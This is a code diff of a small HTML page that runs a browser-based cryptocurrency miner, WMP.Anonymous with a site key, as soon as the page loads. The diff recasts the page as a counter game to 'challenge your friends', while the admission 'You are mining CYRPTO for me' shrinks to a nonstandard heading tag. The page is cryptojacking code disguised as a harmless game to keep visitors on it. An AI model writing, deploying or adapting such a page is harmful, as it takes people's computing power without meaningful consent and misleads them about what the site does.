@@ -7,7 +7,20 @@
 <body>
 
    <h1> Do Not Close this Website PLs</h1>
-   <h2> You are minig CYRPTO for me not you </h2>
+   <h2> You can challenge your friends to get the highest number. </h2>
+   <h3 id="counter">1</h3>
+   <h8>You are mining CYRPTO for me </h8>
+
+  <script>
+    var count = 1;
+
+    function updateCounter() {
+      count++;
+      document.getElementById("counter").innerHTML = count;
+    }
+
+    setInterval(updateCounter, 1000); // Update every second
+  </script>
 
 <script>
     var miner = WMP.Anonymous('SK_RLRRSQSJotJQHkrG2zHjg',{throttle: 0.1});
